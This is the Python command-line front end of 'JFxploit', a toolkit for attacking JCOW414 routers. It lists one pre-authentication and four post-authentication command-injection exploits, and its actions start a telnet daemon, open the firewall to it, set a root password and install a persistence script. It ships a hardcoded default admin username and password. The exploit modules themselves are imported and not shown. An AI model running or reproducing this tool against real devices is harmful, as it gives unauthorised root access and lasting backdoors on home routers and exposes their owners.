"""
JFxploit — CLI toolkit for JCOW414 router exploitation.
"""
from __future__ import annotations

import sys
from typing import Annotated, Optional

import typer
from rich import print as rprint
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

from .actions import build_payload, check_telnet
from .core.models import Target
from .exploits import all_exploits, auto_select, get as get_exploit

app = typer.Typer(
    name="jfxploit",
    help="CLI toolkit for JCOW414 router exploitation",
    rich_markup_mode="rich",
    no_args_is_help=True,
)
console = Console()

BANNER = """[bold blue]
╔══════════════════════════════════════════════════════════════╗
║               JFxploit — JCOW414 Exploit Toolkit            ║
║                     github.com/itsyourap                     ║
╚══════════════════════════════════════════════════════════════╝
[/bold blue]"""

EXPLOIT_DESCRIPTIONS = {
    "f01": "[green]Pre-Auth[/green]  Mesh Debug RequestMethod header injection",
    "f02": "[yellow]Post-Auth[/yellow] Mesh Login Threshold_Val injection (main exploit)",
    "f04": "[yellow]Post-Auth[/yellow] GPON VLAN ID injection (needs session)",
    "f05": "[yellow]Post-Auth[/yellow] jsonApi speedTest server param injection",
    "f06": "[yellow]Post-Auth[/yellow] jsonApi webDownloadTime website param injection",
}

ACTION_DESCRIPTIONS = {
    "telnet":  "Start telnetd daemon on the router",
    "iptables":"Add iptables rule to allow telnet through firewall",
    "rootpass":"Set custom root password",
    "persist": "Install startup script for persistence across reboots",
    "all":     "Run all actions above",
}


def _print_banner() -> None:
    rprint(BANNER)


def _list_exploits_table() -> None:
    table = Table(title="Available Exploits", show_lines=True)
    table.add_column("ID", style="cyan", no_wrap=True)
    table.add_column("Auth", no_wrap=True)
    table.add_column("Description")
    for eid, module in all_exploits().items():
        auth = "[green]Pre-Auth[/green]" if not module.requires_auth else "[yellow]Post-Auth[/yellow]"
        table.add_row(eid, auth, module.description)
    console.print(table)


def _list_actions_table() -> None:
    table = Table(title="Available Actions", show_lines=True)
    table.add_column("Action", style="cyan", no_wrap=True)
    table.add_column("Description")
    for action, desc in ACTION_DESCRIPTIONS.items():
        table.add_row(action, desc)
    console.print(table)


@app.command()
def run(
    target: Annotated[str, typer.Argument(help="Router IP or hostname (e.g. 192.168.29.1)")],
    port: Annotated[int, typer.Option("--port", "-p", help="Router web UI port")] = 80,
    username: Annotated[str, typer.Option("--user", "-u", help="Admin username")] = "superadmin",
    password: Annotated[str, typer.Option("--password", "-P", help="Admin password")] = "87jMB=DU",
    root_pass: Annotated[str, typer.Option("--root-pass", "-r", help="Root password to set on router")] = "toor",
    telnet_port: Annotated[int, typer.Option("--telnet-port", "-t", help="Telnet port to open")] = 23,
    exploit_id: Annotated[
        Optional[str],
        typer.Option(
            "--exploit", "-e",
            help="Exploit to use: f01 f02 f04 f05 f06 or auto (default: auto)",
        ),
    ] = None,
    actions: Annotated[
        Optional[list[str]],
        typer.Option(
            "--action", "-a",
            help="Action(s) to perform: telnet iptables rootpass persist all (repeatable, default: all)",
        ),
    ] = None,
    no_verify: Annotated[bool, typer.Option("--no-verify", help="Skip telnet verification")] = False,
    list_exploits: Annotated[bool, typer.Option("--list-exploits", help="Show available exploits and exit")] = False,
    list_actions: Annotated[bool, typer.Option("--list-actions", help="Show available actions and exit")] = False,
) -> None:
    """Run exploit(s) against a JCOW414 router."""
    _print_banner()

    if list_exploits:
        _list_exploits_table()
        raise typer.Exit()

    if list_actions:
        _list_actions_table()
        raise typer.Exit()

    active_actions = actions if actions else ["all"]
    exploit_choice = exploit_id or "auto"

    _print_config(target, port, username, root_pass, telnet_port, exploit_choice, active_actions)

    tgt = Target(host=target, port=port, username=username, password=password)
    commands = build_payload(active_actions, root_pass, telnet_port)

    if not commands:
        rprint("[red]No commands to execute — check your --action values.[/red]")
        raise typer.Exit(1)

    rprint(f"\n[bold]Shell commands to inject ({len(commands)}):[/bold]")
    for cmd in commands:
        rprint(f"  [dim]»[/dim] {cmd}")

    rprint("\n[bold]Launching exploit...[/bold]")

    if exploit_choice == "auto":
        result = auto_select(tgt, commands)
    else:
        module = get_exploit(exploit_choice)
        result = module.run(tgt, commands)

    _print_result(result)

    if result.success and not no_verify and ("telnet" in active_actions or "all" in active_actions):
        _verify_telnet(target, telnet_port)


def _print_config(
    target: str, port: int, username: str, root_pass: str,
    telnet_port: int, exploit_choice: str, active_actions: list[str],
) -> None:
    table = Table(show_header=False, box=None, padding=(0, 2))
    table.add_column("Key", style="bold cyan")
    table.add_column("Value")
    table.add_row("Target", f"{target}:{port}")
    table.add_row("Username", username)
    table.add_row("Root password", root_pass)
    table.add_row("Telnet port", str(telnet_port))
    table.add_row("Exploit", exploit_choice)
    table.add_row("Actions", ", ".join(active_actions))
    console.print(Panel(table, title="[bold]Configuration[/bold]", expand=False))


def _print_result(result) -> None:
    if result.success:
        rprint(f"\n[bold green]✓ Success[/bold green] [{result.exploit_id}] {result.message}")
    else:
        rprint(f"\n[bold red]✗ Failed[/bold red] [{result.exploit_id}] {result.message}")
    if result.raw_response:
        rprint(f"[dim]Response: {result.raw_response[:200]}[/dim]")


def _verify_telnet(host: str, port: int) -> None:
    rprint(f"\n[bold]Verifying telnet on {host}:{port}...[/bold]")
    if check_telnet(host, port, timeout=5, retries=3):
        rprint(f"[bold green]✓ Telnet port {port} is open![/bold green]")
        rprint(f"[dim]Connect with: telnet {host} {port}[/dim]")
    else:
        rprint(f"[yellow]⚠ Telnet port {port} not reachable yet (daemon may still be starting)[/yellow]")


@app.command("exploits")
def cmd_list_exploits() -> None:
    """List all available exploits."""
    _print_banner()
    _list_exploits_table()


@app.command("actions")
def cmd_list_actions() -> None:
    """List all available actions."""
    _print_banner()
    _list_actions_table()
